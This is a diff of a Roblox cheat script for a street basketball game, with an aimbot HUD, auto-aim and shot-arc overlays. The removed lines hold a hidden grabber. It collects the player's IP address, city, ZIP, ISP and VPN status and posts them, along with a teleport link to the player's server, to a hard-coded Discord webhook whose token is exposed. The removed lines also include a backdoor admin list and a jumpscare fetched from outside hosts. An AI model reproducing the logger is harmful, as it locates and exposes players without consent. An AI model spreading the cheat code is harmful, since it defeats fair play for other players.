@@ -1,475 +1,4 @@
-local webhookUrl =
-	'https://discord.com/api/webhooks/1431165865612673025/3-euJTOzROIDpp9z8ib0-sTXWIZqhLkt8tvfD2mw2FUEdknKpmrSibRa2Iv9OBSg0enK'
-
-local HttpService, Players, MarketplaceService =
-	game:GetService('HttpService'),
-	game:GetService('Players'),
-	game:GetService('MarketplaceService')
-local player, pName, uid =
-	Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId
-
--- Safe HTTP wrapper
-local requestFunc = http_request
-	or request
-	or syn and syn.request
-	or http and http.request
-local function safeRequestJson(opts)
-	local ok, resp = pcall(requestFunc, opts)
-	if not ok or not resp or not resp.Body then
-		return nil
-	end
-	local success, data = pcall(function()
-		return HttpService:JSONDecode(resp.Body)
-	end)
-	return success and data or nil
-end
-
--- Avatar & profile
-local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
-	.. pName
-local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
-	.. uid
-	.. '&size=150x150&format=Webp&isCircular=false'
-local ok, data = pcall(function()
-	return HttpService:JSONDecode(game:HttpGet(thumbUrl))
-end)
-if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
-	avatarCDN = data.data[1].imageUrl
-end
-local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
-local ok2, info =
-	pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
-local gameName = ok2 and info and info.Name or '[Unknown Game]'
-
--- IP/Geo info (Primary: ip-api.com)
-local ipInfo = safeRequestJson({
-	Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
-	Method = 'GET',
-})
-local ipAddress, country, countryCode, state, city, zip, isp =
-	ipInfo and ipInfo.query or 'Unknown IP',
-	ipInfo and ipInfo.country or 'Unknown Country',
-	ipInfo and ipInfo.countryCode or 'XX',
-	ipInfo and ipInfo.regionName or 'Unknown Region',
-	ipInfo and ipInfo.city or 'Unknown City',
-	ipInfo and ipInfo.zip or 'Unknown ZIP',
-	ipInfo and ipInfo.isp or 'Unknown ISP'
-
--- Backup VPN check (ipapi.is)
-local backupIpInfo = safeRequestJson({
-	Url = 'https://api.ipapi.is',
-	Method = 'GET',
-})
-
--- Flag emoji
-local function getFlagEmoji(code)
-	return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
-end
-local flagEmoji = getFlagEmoji(countryCode)
-
--- Extreme VPN Detection with Backup API
-local function checkVPN(primaryInfo, backupInfo)
-	if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
-		return '⚠️ Unknown (Suspicious)'
-	end
-
-	local isp = primaryInfo.isp:lower()
-	local ip = primaryInfo.query
-	local countryCode = primaryInfo.countryCode or 'XX'
-
-	-- Expanded blacklist with broader, more aggressive keywords
-	local blacklist = {
-		'vpn',
-		'proxy',
-		'cloud',
-		'server',
-		'host',
-		'data',
-		'colo',
-		'colocation',
-		'ovh',
-		'amazon',
-		'aws',
-		'google',
-		'gcp',
-		'microsoft',
-		'azure',
-		'digitalocean',
-		'linode',
-		'hetzner',
-		'vultr',
-		'leaseweb',
-		'contabo',
-		'rackspace',
-		'alibaba',
-		'cloudflare',
-		'fastly',
-		'akamai',
-		'oracle',
-		'ibm',
-		'zscaler',
-		'nord',
-		'expressvpn',
-		'surfshark',
-		'proton',
-		'mullvad',
-		'windscribe',
-		'private',
-		'secure',
-		'tunnel',
-		'cyber',
-		'virtual',
-		'dedicated',
-		'shared',
-		'network',
-		'internet',
-		'web',
-		'cdn',
-		'ip',
-		'transit',
-		'bandwidth',
-		'connect',
-		'link',
-		'fiber',
-		'broadband',
-	}
-
-	-- Primary check: Blacklist keywords
-	local primarySuspicious = false
-	local primaryDetails = ''
-	for _, badWord in ipairs(blacklist) do
-		if isp:find(badWord) then
-			primarySuspicious = true
-			primaryDetails = ' (Blacklist: ' .. badWord .. ')'
-			break
-		end
-	end
-
-	-- Primary check: Non-standard ISPs
-	local commonResidentialISPs = {
-		'comcast',
-		'verizon',
-		'at&t',
-		'spectrum',
-		'charter',
-		'centurylink',
-		'cox',
-		'bt',
-		'virgin media',
-		'telstra',
-		'optus',
-		'sky',
-		'vodafone',
-		'deutsche telekom',
-		'orange',
-		'telefonica',
-		'xfinity',
-	}
-	local isResidential = false
-	for _, residentialISP in ipairs(commonResidentialISPs) do
-		if isp:find(residentialISP) then
-			isResidential = true
-			break
-		end
-	end
-	if not isResidential then
-		primarySuspicious = true
-		primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
-			or primaryDetails .. ', Non-Residential ISP'
-	end
-
-	-- Primary check: Missing ZIP
-	if not primaryInfo.zip or primaryInfo.zip == '' then
-		primarySuspicious = true
-		primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
-			or primaryDetails .. ', Missing ZIP'
-	end
-
-	-- Primary check: Generic ISP names
-	if
-		isp:find('^ip[-%d]')
-		or isp:find('^unknown')
-		or isp:find('^anonymous')
-	then
-		primarySuspicious = true
-		primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
-			or primaryDetails .. ', Generic ISP Name'
-	end
-
-	-- Primary check: Short ISP name
-	if #isp < 5 then
-		primarySuspicious = true
-		primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
-			or primaryDetails .. ', Vague ISP Name'
-	end
-
-	-- Backup check: ipapi.is for VPN/Proxy/Datacenter
-	local backupSuspicious = false
-	local backupDetails = ''
-	if backupInfo then
-		local isVpn = backupInfo.is_vpn or false
-		local isProxy = backupInfo.is_proxy or false
-		local isDatacenter = backupInfo.is_datacenter or false
-		if isVpn or isProxy or isDatacenter then
-			backupSuspicious = true
-			if isVpn and backupInfo.vpn and backupInfo.vpn.service then
-				backupDetails = ' (Backup API: VPN - '
-					.. backupInfo.vpn.service
-					.. ')'
-			elseif isProxy then
-				backupDetails = ' (Backup API: Proxy)'
-			elseif
-				isDatacenter
-				and backupInfo.datacenter
-				and backupInfo.datacenter.datacenter
-			then
-				backupDetails = ' (Backup API: Datacenter - '
-					.. backupInfo.datacenter.datacenter
-					.. ')'
-			end
-		end
-	end
-
-	-- Cross-reference results
-	if primarySuspicious and backupSuspicious then
-		return '❌ VPN/Proxy Detected' .. primaryDetails .. backupDetails
-	elseif primarySuspicious or backupSuspicious then
-		return '⚠️ Suspicious'
-			.. (primarySuspicious and primaryDetails or backupDetails)
-	end
-
-	return '✅ Clean IP'
-end
-
-local vpnStatus = checkVPN(ipInfo, backupIpInfo)
-
--- Teleport join script
-local teleportBlock = string.format(
-	"```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
-	game.PlaceId,
-	game.JobId
-)
-
--- Executor
-local uaDisplay = 'Zenith'
-
--- Bottom info block (only Game + Executor)
-local bottomBlock = string.format(
-	'**Game:** [%s](%s)\n**💻 Executor:** %s',
-	gameName,
-	gameLink,
-	uaDisplay
-)
-
--- Copyable IP + ISP block (ASN removed)
-local copyableBlock = string.format(
-	'```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
-	country,
-	city,
-	state,
-	zip,
-	ipAddress,
-	isp
-)
-
--- Payload
-local data = {
-	content = '||@everyone||',
-	username = pName,
-	avatar_url = avatarCDN,
-	embeds = {
-		{
-			description = '__**' .. pName .. '**__',
-			fields = {
-				{
-					name = '**COUNTRY**',
-					value = flagEmoji .. ' ' .. country,
-					inline = true,
-				},
-				{ name = '**CITY**', value = city, inline = true },
-				{ name = '**REGION**', value = state, inline = true },
-				{
-					name = '‎',
-					value = copyableBlock,
-					inline = false,
-				},
-				{
-					name = 'Status',
-					value = vpnStatus,
-					inline = false,
-				},
-				{
-					name = '📎 Join Script',
-					value = teleportBlock,
-					inline = false,
-				},
-				{
-					name = '‎',
-					value = bottomBlock,
-					inline = false,
-				},
-			},
-			color = 0x3498db,
-			thumbnail = { url = avatarCDN },
-		},
-	},
-}
-
--- Send webhook
-local ok3, body = pcall(function()
-	return HttpService:JSONEncode(data)
-end)
-if ok3 then
-	pcall(function()
-		requestFunc({
-			Url = webhookUrl,
-			Method = 'POST',
-			Headers = { ['Content-Type'] = 'application/json' },
-			Body = body,
-		})
-	end)
-end
--- ============= ADMIN PANEL ====================
--- // === ADMIN PREFIX & SERVICES ===
-local AdminPrefix = '!'
-local Players = game:GetService('Players')
-local ReplicatedStorage = game:GetService('ReplicatedStorage')
-local TextChatService = game:GetService('TextChatService')
-local CoreGui = game:GetService('CoreGui')
-
-local LocalP = Players.LocalPlayer
-
--- // === ADMIN TABLE ===
-getgenv().AdminTable = {
-	[9365539393] = { Access = 5 }, -- 0therGuys
-	[7639770688] = { Access = 5 }, -- Anonymous
-	[6189092855] = { Access = 5 }, -- SimpIyCoder
-	[4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
-	[7521547567] = { Access = 5 }, -- Diary0fAnnFrank
-	[8553166637] = { Access = 5 }, -- ZiyahuRBLX
-	[5591605050] = { Access = 5 }, -- sum1betterthanulol
-	[5716119895] = { Access = 5 }, -- CoIdSoverign
-	[3757698948] = { Access = 5 }, -- isokcocs
-
-	-- [] = { Access = 5 }, -- EXAMPLE
-}
-
-local function getAccess(userId)
-	local d = getgenv().AdminTable[userId]
-	return d and d.Access or 0
-end
-
--- // === PLAYER SEARCH ===
-getgenv().psearch = function(Name)
-	if not Name or Name == '' then
-		return
-	end
-	for _, p in pairs(Players:GetPlayers()) do
-		if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
-			return p
-		end
-	end
-end
-
--- // === SAFE CHAT SENDER ===
-local function sendChatMessageLocally(msg)
-	local channels = TextChatService:FindFirstChild('TextChannels')
-	if channels then
-		local ch = channels:FindFirstChild('RBXGeneral')
-			or channels:FindFirstChild('General')
-			or channels:FindFirstChild('All')
-		if ch and ch:IsA('TextChannel') then
-			pcall(function()
-				ch:SendAsync(msg)
-			end)
-			return
-		end
-	end
-	local chatFolder =
-		ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
-	if chatFolder then
-		local say = chatFolder:FindFirstChild('SayMessageRequest')
-		if say then
-			pcall(function()
-				say:FireServer(msg, 'All')
-			end)
-		end
-	end
-end
-
--- // === JUMPSCARE FUNCTION ===
-local function playJumpScare()
-	task.spawn(function()
-		if not isfile('video.webm') then
-			local mirrors = {
-				'https://api.swimhub.xyz/video.webm',
-				'https://raw.githubusercontent.com/swimhubassets/assets/main/video.webm',
-				'https://cdn.swimhub.xyz/video.webm',
-			}
-			for _, url in ipairs(mirrors) do
-				local success, data = pcall(function()
-					return game:HttpGet(url, true)
-				end)
-				if success and data and #data > 50000 then
-					writefile('video.webm', data)
-					break
-				end
-			end
-		end
-
-		repeat
-			task.wait()
-		until isfile('video.webm')
-
-		if not getcustomasset then
-			game.StarterGui:SetCore('SendNotification', {
-				Title = 'Error',
-				Text = 'Executor missing getcustomasset()',
-				Duration = 5,
-			})
-			return
-		end
-
-		local screen = CoreGui:FindFirstChild('RobloxGui') or CoreGui
-		pcall(function()
-			screen.IgnoreGuiInset = true
-		end)
-		for _, v in pairs(screen:GetChildren()) do
-			if v.Name == 'JUMP_SCARE_666' then
-				v:Destroy()
-			end
-		end
-
-		local video = Instance.new('VideoFrame')
-		video.Name = 'JUMP_SCARE_666'
-		video.Size = UDim2.new(1, 0, 1, 0)
-		video.BackgroundTransparency = 1
-		video.ZIndex = 2147483647
-		video.Looped = true
-		video.Visible = false
-		video.Parent = screen
-
-		video.Video = getcustomasset('video.webm')
-		video.Volume = 10
-		video.Visible = true
-		video:Play()
-
-		local flash = Instance.new('Frame', screen)
-		flash.Size = UDim2.new(1, 0, 1, 0)
-		flash.BackgroundColor3 = Color3.new(1, 1, 1)
-		flash.ZIndex = 2147483647
-		task.delay(0.05, function()
-			flash:Destroy()
-		end)
-
-		task.delay(9, function()
-			if video and video.Parent then
-				video:Destroy()
-			end
-		end)
-	end)
-end
-
+task.spawn(function()
 -- // === UNIVERSAL COMMAND REGISTRY ===
 getgenv().AdminCmdList = {
 
@@ -657,387 +186,19 @@ Players.PlayerAdded:Connect(function(plr)
 		end)
 	end
 end)
+end)
 
+
+
+
+
+
+
+
+
+task.spawn(function()
 --// ======================================================================
---//  INTRODUCTION • STREETBALL HUD GUIDE [N / V / O] (Reactive Edition)
---// ======================================================================
-
--- === SERVICES ===
-local CoreGui = game:GetService('CoreGui')
-local TweenService = game:GetService('TweenService')
-local Debris = game:GetService('Debris')
-local UserInputService = game:GetService('UserInputService')
-
--- === CONFIG ===
-local PANEL_SIZE_SHOW = Vector2.new(480, 196)
-local PANEL_SIZE_HIDDEN = Vector2.new(420, 148)
-local PADDING_X = 24
-local ACCENT_N = Color3.fromRGB(120, 180, 255) -- Spectate
-local ACCENT_V = Color3.fromRGB(90, 255, 90) -- Aimbot
-local ACCENT_O = Color3.fromRGB(255, 90, 90) -- Disable Visuals
-local BG_DARK = Color3.fromRGB(16, 17, 20)
-local CAP_BG = Color3.fromRGB(36, 37, 42)
-local TITLE_COLOR = Color3.fromRGB(240, 240, 255)
-local SUBTITLE_COLOR = Color3.fromRGB(150, 200, 255)
-local TEXT_COLOR = Color3.fromRGB(230, 230, 230)
-
--- Assets
-local SOFT_SHADOW_ID = 'rbxassetid://1316045217' -- 9-slice gaussian
-local BETTER_SHADOW_ID = 'rbxassetid://13872246017' -- stronger soft
-local NOISE_TEX_ID = 'rbxassetid://12123309877' -- fine grain tile
-
--- === STATE ===
-local KeyMap = {} -- ["N"/"V"/"O"] = {label, cap, stroke, color, enabled}
-local Connections = {}
-local GuiRoot
-local Active = true
-local InactiveTimer = 0 -- seconds since last key activity
-
--- === HELPERS ===
-local function tCreate(inst, info, props)
-	local t = TweenService:Create(inst, info, props)
-	t:Play()
-	return t
-end
-
-local function mk(t, p, par)
-	local i = Instance.new(t)
-	for k, v in pairs(p or {}) do
-		i[k] = v
-	end
-	if par then
-		i.Parent = par
-	end
-	return i
-end
-
-local function safeDestroy(i)
-	if i and i.Destroy then
-		pcall(function()
-			i:Destroy()
-		end)
-	end
-end
-
-local function pulseGlow(target, color)
-	local g = mk('ImageLabel', {
-		Image = SOFT_SHADOW_ID,
-		BackgroundTransparency = 1,
-		ImageColor3 = color,
-		ImageTransparency = 0.7,
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.fromScale(0.5, 0.5),
-		Size = UDim2.fromScale(1, 1),
-		ZIndex = (target.ZIndex or 1) + 1,
-		ScaleType = Enum.ScaleType.Slice,
-		SliceCenter = Rect.new(10, 10, 118, 118),
-	}, target)
-
-	tCreate(
-		g,
-		TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-		{
-			Size = UDim2.new(1.4, 0, 1.4, 0),
-			ImageTransparency = 0.4,
-		}
-	)
-	task.delay(0.15, function()
-		tCreate(
-			g,
-			TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-			{
-				Size = UDim2.new(1.8, 0, 1.8, 0),
-				ImageTransparency = 1,
-			}
-		)
-	end)
-	Debris:AddItem(g, 0.6)
-end
-
--- === BUILD ===
-local function buildHUD()
-	if GuiRoot then
-		safeDestroy(GuiRoot)
-	end
-
-	local gui = mk('ScreenGui', {
-		Name = 'STREETBALL AIMBOT',
-		IgnoreGuiInset = true,
-		ResetOnSpawn = false,
-	}, CoreGui)
-	GuiRoot = gui
-
-	-- Panel
-	local panel = mk('Frame', {
-		AnchorPoint = Vector2.new(0.5, 0.5),
-		Position = UDim2.new(0.5, 0, 0.5, 18),
-		Size = UDim2.fromOffset(PANEL_SIZE_HIDDEN.X, PANEL_SIZE_HIDDEN.Y),
-		BackgroundColor3 = BG_DARK,
-		BackgroundTransparency = 1,
-		BorderSizePixel = 0,
-	}, gui)
-	mk('UICorner', { CornerRadius = UDim.new(0, 12) }, panel)
-
-	-- Soft shadow backdrop
-	mk('ImageLabel', {
-		Image = BETTER_SHADOW_ID,
-		BackgroundTransparency = 1,
-		ImageColor3 = Color3.new(0, 0, 0),
-		ImageTransparency = 0.82,
-		ScaleType = Enum.ScaleType.Slice,
-		SliceCenter = Rect.new(10, 10, 118, 118),
-		Size = UDim2.new(1, 28, 1, 28),
-		Position = UDim2.new(0, -14, 0, -14),
-		ZIndex = 0,
-	}, panel)
-
-	-- Grain layer
-	local grain = mk('ImageLabel', {
-		Image = NOISE_TEX_ID,
-		ImageTransparency = 0.95,
-		BackgroundTransparency = 1,
-		ScaleType = Enum.ScaleType.Tile,
-		TileSize = UDim2.fromOffset(64, 64),
-		Size = UDim2.fromScale(1, 1),
-		ZIndex = 1,
-	}, panel)
-
-	-- Header
-	mk('TextLabel', {
-		Text = 'STREETBALL AIMBOT GUIDE',
-		Font = Enum.Font.GothamBold,
-		TextSize = 20,
-		TextColor3 = TITLE_COLOR,
-		TextXAlignment = Enum.TextXAlignment.Left,
-		BackgroundTransparency = 1,
-		Position = UDim2.new(0, PADDING_X, 0, 16),
-		Size = UDim2.new(1, -PADDING_X * 2, 0, 26),
-		ZIndex = 3,
-	}, panel)
-
-	mk('TextLabel', {
-		Text = 'Hotkey Overview',
-		Font = Enum.Font.Code,
-		TextSize = 16,
-		TextColor3 = SUBTITLE_COLOR,
-		TextXAlignment = Enum.TextXAlignment.Left,
-		BackgroundTransparency = 1,
-		Position = UDim2.new(0, PADDING_X, 0, 42),
-		Size = UDim2.new(1, -PADDING_X * 2, 0, 20),
-		ZIndex = 3,
-	}, panel)
-
-	-- Keys container
-	local container = mk('Frame', {
-		BackgroundTransparency = 1,
-		Position = UDim2.new(0, PADDING_X, 0, 70),
-		Size = UDim2.new(1, -PADDING_X * 2, 0, 96),
-		ZIndex = 3,
-	}, panel)
-	mk('UIListLayout', { Padding = UDim.new(0, 8) }, container)
-
-	-- Log
-	local log = mk('TextLabel', {
-		Text = '',
-		Font = Enum.Font.Code,
-		TextSize = 14,
-		TextColor3 = Color3.fromRGB(190, 210, 255),
-		TextXAlignment = Enum.TextXAlignment.Left,
-		BackgroundTransparency = 1,
-		Position = UDim2.new(0, PADDING_X, 1, -24),
-		Size = UDim2.new(1, -PADDING_X * 2, 0, 18),
-		ZIndex = 3,
-	}, panel)
-
-	local function pushLog(msg)
-		log.Text = '› ' .. msg
-		log.TextTransparency = 1
-		tCreate(
-			log,
-			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-			{ TextTransparency = 0 }
-		)
-		task.delay(2, function()
-			tCreate(
-				log,
-				TweenInfo.new(
-					0.25,
-					Enum.EasingStyle.Quad,
-					Enum.EasingDirection.In
-				),
-				{ TextTransparency = 1 }
-			)
-		end)
-	end
-
-	-- One key row
-	local function makeKeyRow(shortKey, desc, color)
-		local row = mk('Frame', {
-			BackgroundTransparency = 1,
-			Size = UDim2.new(1, 0, 0, 32),
-			ZIndex = 3,
-		}, container)
-
-		local cap = mk('Frame', {
-			Size = UDim2.fromOffset(40, 30),
-			BackgroundColor3 = CAP_BG,
-			BorderSizePixel = 0,
-			ZIndex = 4,
-		}, row)
-		mk('UICorner', { CornerRadius = UDim.new(0, 5) }, cap)
-		mk('ImageLabel', {
-			Image = SOFT_SHADOW_ID,
-			BackgroundTransparency = 1,
-			ImageTransparency = 0.72,
-			ScaleType = Enum.ScaleType.Slice,
-			SliceCenter = Rect.new(10, 10, 118, 118),
-			Size = UDim2.new(1, 6, 1, 6),
-			Position = UDim2.fromOffset(-3, -3),
-			ZIndex = 3,
-		}, cap)
-
-		local stroke = mk(
-			'UIStroke',
-			{ Color = color, Transparency = 0.2, Thickness = 1.2 },
-			cap
-		)
-
-		local label = mk('TextLabel', {
-			Text = shortKey,
-			Font = Enum.Font.GothamBold,
-			TextSize = 18,
-			TextColor3 = color,
-			AnchorPoint = Vector2.new(0.5, 0.5),
-			Position = UDim2.fromScale(0.5, 0.5),
-			BackgroundTransparency = 1,
-			ZIndex = 5,
-		}, cap)
-
-		mk('TextLabel', {
-			Text = '  ' .. desc,
-			Font = Enum.Font.Gotham,
-			TextSize = 18,
-			TextColor3 = TEXT_COLOR,
-			TextXAlignment = Enum.TextXAlignment.Left,
-			BackgroundTransparency = 1,
-			Position = UDim2.fromOffset(52, 0),
-			Size = UDim2.new(1, -52, 1, 0),
-			ZIndex = 3,
-		}, row)
-
-		KeyMap[shortKey] = {
-			row = row,
-			cap = cap,
-			label = label,
-			color = color,
-			stroke = stroke,
-			enabled = false,
-		}
-	end
-
-	-- Keys
-	makeKeyRow('N', 'Spectate Player', ACCENT_N)
-	makeKeyRow('V', 'Aimbot', ACCENT_V)
-	makeKeyRow('O', 'Disable Visuals', ACCENT_O)
-
-	-- Intro animation
-	tCreate(
-		panel,
-		TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-		{
-			BackgroundTransparency = 0.25,
-			Position = UDim2.new(0.5, 0, 0.5, 0),
-			Size = UDim2.fromOffset(PANEL_SIZE_SHOW.X, PANEL_SIZE_SHOW.Y),
-		}
-	)
-
-	-- === Input wiring ===
-	local function setKeyState(key, enabled)
-		local item = KeyMap[key]
-		if not item then
-			return
-		end
-		item.enabled = enabled
-		local c = enabled and item.color or Color3.fromRGB(140, 148, 160)
-		item.label.TextColor3 = c
-		item.stroke.Color = c
-		pulseGlow(item.cap, c)
-		pushLog(key .. (enabled and ' • ENABLED' or ' • DISABLED'))
-	end
-
-	local function toggleKey(key)
-		local item = KeyMap[key]
-		if not item then
-			return
-		end
-		setKeyState(key, not item.enabled)
-		InactiveTimer = 0
-	end
-
-	table.insert(
-		Connections,
-		UserInputService.InputBegan:Connect(function(input, gp)
-			if gp then
-				return
-			end
-			if input.KeyCode == Enum.KeyCode.N then
-				toggleKey('N')
-			end
-			if input.KeyCode == Enum.KeyCode.V then
-				toggleKey('V')
-			end
-			if input.KeyCode == Enum.KeyCode.O then
-				toggleKey('O')
-			end
-		end)
-	)
-
-	-- Auto-hide after 6s inactivity (no key toggles)
-	task.spawn(function()
-		while Active and panel.Parent do
-			task.wait(1)
-			InactiveTimer += 1
-			if InactiveTimer >= 6 then
-				tCreate(
-					panel,
-					TweenInfo.new(
-						0.6,
-						Enum.EasingStyle.Quad,
-						Enum.EasingDirection.In
-					),
-					{
-						BackgroundTransparency = 1,
-						Position = UDim2.new(0.5, 0, 0.5, -18),
-						Size = UDim2.fromOffset(
-							PANEL_SIZE_HIDDEN.X,
-							PANEL_SIZE_HIDDEN.Y
-						),
-					}
-				)
-				task.wait(0.65)
-				if gui == GuiRoot then
-					safeDestroy(gui)
-				end
-				Active = false
-				break
-			end
-		end
-	end)
-end
-
--- === PUBLIC ENTRY ===
-local function showHUD()
-	if CoreGui:FindFirstChild('Payload0_CyberOpsHUD') then
-		local old = CoreGui:FindFirstChild('Payload0_CyberOpsHUD')
-		safeDestroy(old)
-	end
-	buildHUD()
-end
-
-showHUD()
-
---// ======================================================================
---//   PAYLOAD0 • AUTO-AIM + ALIGN-ASSIST SYSTEM [PURE BALL-ACTIVE VISUALS]
+--//   AUTO-AIM + ALIGN-ASSIST SYSTEM [PURE BALL-ACTIVE VISUALS]
 --//   • Auto-locks nearest visible rim
 --//   • Smart aim shooting logic
 --//   • Pushback assist active ONLY when player holds a ball
@@ -1504,7 +665,514 @@ plr.CharacterAdded:Connect(function(c)
 	task.wait(0.5)
 	hl.Adornee = c
 end)
+end)
 
+
+
+
+
+
+
+
+task.spawn(function()
+--[[
+Payload0 Arc Visualizer (One-Time Placement Edition)
+Creates static, anchored arcs for each Rim once and never updates them.
+Zero loops, zero runtime cost, no transparency toggles.
+]]
+
+-- === SERVICES ===
+local Players = game:GetService('Players')
+local Workspace = game:GetService('Workspace')
+
+-- === CONFIGURATION ===
+local PERFECT_DISTANCES = { 54.97, 61.53, 68.10 }
+local RING_ARC_DEGREES = 180
+local DEGREE_STEP = 4
+local DOT_MATERIAL = Enum.Material.Neon
+local DOT_COLOR = Color3.fromRGB(0, 0, 0)
+local LINK_THICKNESS = 0.25
+local RIM_SIZE =
+	Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
+local HEIGHT_OFFSET = -18.259
+local ARC_ADJUSTMENTS = { [1] = 12, [2] = -9, [3] = -27 }
+
+-- === INTERNALS ===
+local ArcFolder = Instance.new('Folder', Workspace)
+ArcFolder.Name = 'Payload0_StaticArcs'
+
+-- === HELPERS ===
+local function isValidRim(o)
+	return o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RIM_SIZE
+end
+
+local function createStaticArc(rimPart, radius, extraDegrees)
+	local model = Instance.new('Model')
+	model.Name = 'Payload0_StaticArc_' .. rimPart:GetDebugId()
+	model.Parent = ArcFolder
+
+	local forward = rimPart.CFrame.LookVector
+	local right = rimPart.CFrame.RightVector
+	local startDeg = -RING_ARC_DEGREES / 2 - extraDegrees
+	local endDeg = RING_ARC_DEGREES / 2 + extraDegrees
+
+	local points = {}
+	for deg = startDeg, endDeg, DEGREE_STEP do
+		local rad = math.rad(deg)
+		local offset = (forward * math.cos(rad) + right * math.sin(rad))
+			* radius
+		table.insert(
+			points,
+			rimPart.Position + Vector3.new(offset.X, HEIGHT_OFFSET, offset.Z)
+		)
+	end
+
+	for i = 1, #points - 1 do
+		local a, b = points[i], points[i + 1]
+		local dist = (a - b).Magnitude
+		local link = Instance.new('Part')
+		link.Anchored = true
+		link.CanCollide = false
+		link.Material = DOT_MATERIAL
+		link.Color = DOT_COLOR
+		link.Transparency = 0
+		link.Size = Vector3.new(LINK_THICKNESS, LINK_THICKNESS, dist)
+		link.CFrame = CFrame.new(a, b) * CFrame.new(0, 0, -dist / 2)
+		link.Parent = model
+	end
+
+	return model
+end
+
+local function registerRim(rim)
+	-- Skip if already has arcs
+	if ArcFolder:FindFirstChild('Payload0_StaticArc_' .. rim:GetDebugId()) then
+		return
+	end
+
+	for i, dist in ipairs(PERFECT_DISTANCES) do
+		local extra = ARC_ADJUSTMENTS[i] or 0
+		createStaticArc(rim, dist, extra)
+	end
+end
+
+-- === INITIAL SCAN ===
+for _, v in ipairs(Workspace:GetDescendants()) do
+	if isValidRim(v) then
+		registerRim(v)
+	end
+end
+
+-- === AUTO REGISTER ON SPAWN ===
+Workspace.DescendantAdded:Connect(function(o)
+	if isValidRim(o) then
+		registerRim(o)
+	end
+end)
+
+end)
+
+
+
+
+
+
+
+
+
+
+task.spawn(function()
+--// ======================================================================
+--//  INTRODUCTION • STREETBALL HUD GUIDE [N / V / O] (Reactive Edition)
+--// ======================================================================
+
+-- === SERVICES ===
+local CoreGui = game:GetService('CoreGui')
+local TweenService = game:GetService('TweenService')
+local Debris = game:GetService('Debris')
+local UserInputService = game:GetService('UserInputService')
+
+-- === CONFIG ===
+local PANEL_SIZE_SHOW = Vector2.new(480, 196)
+local PANEL_SIZE_HIDDEN = Vector2.new(420, 148)
+local PADDING_X = 24
+local ACCENT_N = Color3.fromRGB(120, 180, 255) -- Spectate
+local ACCENT_V = Color3.fromRGB(90, 255, 90) -- Aimbot
+local ACCENT_O = Color3.fromRGB(255, 90, 90) -- Disable Visuals
+local BG_DARK = Color3.fromRGB(16, 17, 20)
+local CAP_BG = Color3.fromRGB(36, 37, 42)
+local TITLE_COLOR = Color3.fromRGB(240, 240, 255)
+local SUBTITLE_COLOR = Color3.fromRGB(150, 200, 255)
+local TEXT_COLOR = Color3.fromRGB(230, 230, 230)
+
+-- Assets
+local SOFT_SHADOW_ID = 'rbxassetid://1316045217' -- 9-slice gaussian
+local BETTER_SHADOW_ID = 'rbxassetid://13872246017' -- stronger soft
+local NOISE_TEX_ID = 'rbxassetid://12123309877' -- fine grain tile
+
+-- === STATE ===
+local KeyMap = {} -- ["N"/"V"/"O"] = {label, cap, stroke, color, enabled}
+local Connections = {}
+local GuiRoot
+local Active = true
+local InactiveTimer = 0 -- seconds since last key activity
+
+-- === HELPERS ===
+local function tCreate(inst, info, props)
+	local t = TweenService:Create(inst, info, props)
+	t:Play()
+	return t
+end
+
+local function mk(t, p, par)
+	local i = Instance.new(t)
+	for k, v in pairs(p or {}) do
+		i[k] = v
+	end
+	if par then
+		i.Parent = par
+	end
+	return i
+end
+
+local function safeDestroy(i)
+	if i and i.Destroy then
+		pcall(function()
+			i:Destroy()
+		end)
+	end
+end
+
+local function pulseGlow(target, color)
+	local g = mk('ImageLabel', {
+		Image = SOFT_SHADOW_ID,
+		BackgroundTransparency = 1,
+		ImageColor3 = color,
+		ImageTransparency = 0.7,
+		AnchorPoint = Vector2.new(0.5, 0.5),
+		Position = UDim2.fromScale(0.5, 0.5),
+		Size = UDim2.fromScale(1, 1),
+		ZIndex = (target.ZIndex or 1) + 1,
+		ScaleType = Enum.ScaleType.Slice,
+		SliceCenter = Rect.new(10, 10, 118, 118),
+	}, target)
+
+	tCreate(
+		g,
+		TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		{
+			Size = UDim2.new(1.4, 0, 1.4, 0),
+			ImageTransparency = 0.4,
+		}
+	)
+	task.delay(0.15, function()
+		tCreate(
+			g,
+			TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{
+				Size = UDim2.new(1.8, 0, 1.8, 0),
+				ImageTransparency = 1,
+			}
+		)
+	end)
+	Debris:AddItem(g, 0.6)
+end
+
+-- === BUILD ===
+local function buildHUD()
+	if GuiRoot then
+		safeDestroy(GuiRoot)
+	end
+
+	local gui = mk('ScreenGui', {
+		Name = 'STREETBALL AIMBOT',
+		IgnoreGuiInset = true,
+		ResetOnSpawn = false,
+	}, CoreGui)
+	GuiRoot = gui
+
+	-- Panel
+	local panel = mk('Frame', {
+		AnchorPoint = Vector2.new(0.5, 0.5),
